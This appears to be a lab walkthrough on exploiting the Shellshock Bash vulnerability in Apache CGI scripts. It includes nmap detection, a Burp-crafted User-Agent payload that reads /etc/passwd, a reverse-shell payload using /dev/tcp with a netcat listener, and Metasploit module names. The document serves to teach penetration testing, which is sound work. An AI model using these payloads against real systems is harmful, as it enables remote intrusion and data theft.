# Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)

- Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote
access to the target system via a reverse shell.

- The Shellshock vulnerability was discovered by StÃ©phane Chazelas on the 12th of September 2014 and was made public on the 24th of September 2014.

- Bash is a *Nix shell that is part of the GNU project and is the default shell for most Linux distributions.

- The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;};.

- This vulnerability only affects Linux as Windows does not use utilize Bash as it is not a *Nix based operating system.

- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.

- CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.

## Shellshock Exploitation

- In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.

- In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.

- Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.

- This vulnerability can be exploited both manually by using a web proxy and automatically with the use of an MSF exploit module.

## Laboratory

In this laboratory you won't be provided with the target IP address, but you can take your own IP address in the subnet and use the machine in the next ip address. For example x.x.x.2 is your machine and x.x.x.3 is the target.

- Start by performing an nmap scan. If you find a web server, navigate to it using the browser to see the page. You should see a website under construction. As it is a static web page, it shouldn't present any dynamic characteristics. However, the site should present a counter below the "under construction" phrase. This sort of dynamic behavior is achieved by using CGI scripts in Apache. That could mean the server is vulnerable. This can be further confirmed by checking the source of the page and see that the JS script on the website is calling a cgi script.

- Now we need to confirm if the web server is vulnerable to the Shellshock attack. This can be done by using an nmap script called `http-shellshock` with arguments `"http-shellshock.uri=/gettime.cgi"`: `nmap x.x.x.x --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`. It should return relevant information about the target vulnerability and if it is indeed vulnerable to the shellshock attack.

### Exploiting the vulnerability manually

- First we will go to the firefox extensions and look for the FoxyProxy extension that should be already configured. With that extension we will enable the Burp Suite proxy and then we will start the Burp Suite from our kali linux. From there we will start a temporary project to intercept all the traffic comming from the static website.

**Note**: To intercept traffic using the burp proxy, remember to set the intercept option to on.

- Reload the page and intercept the traffic of the .cgi file get request. Then right click on the request and select send to the repeater, remove the User-Agent string and introduce the special characters `() { :; };` and any command you want after in the User-Agent header, for example: `() { :; }; echo; echo; /bin/bash/ -c 'cat /etc/passwd'` and click Send. On the right side of the windows you should see the output of teh command.

- We can run a reverse shell directly using the shellshock exploit. First we need to run with netcat a listening port by running `nc -nvlp 1234`, notice we are listening on port 1234.

- We can send a request using the same User-Agent string and changing the command at the end to start a reverse shell like this: `() { :; }; echo; echo; /bin/bash/ -c 'bash -i>&/dev/tcp/x.x.x.x/1234 0>&1'` where x.x.x.x is your ip address.

**Note**: After successfully connecting, try enumerating some things. For example: `whoami`, `cat /etc/*issue`, `uname -a`, etc.

### Exploiting the vulnerability with msfconsole

- Start an msfconsole and search for shellshock. You will find an auxiliary module called `auxiliary/scanner/http/apache_mod_cgi_bash_env` to see if the target is vulnerable and an exploit module called `exploit/multi/http/apache_mod_cgi_bash_env_exec`.

- Use the `exploit/multi/http/apache_mod_cgi_bash_env_exec` and check the options. At this point you should only need to set the RHOSTS that should be the target ip address and the TARGETURI that is the path to the cgi file.
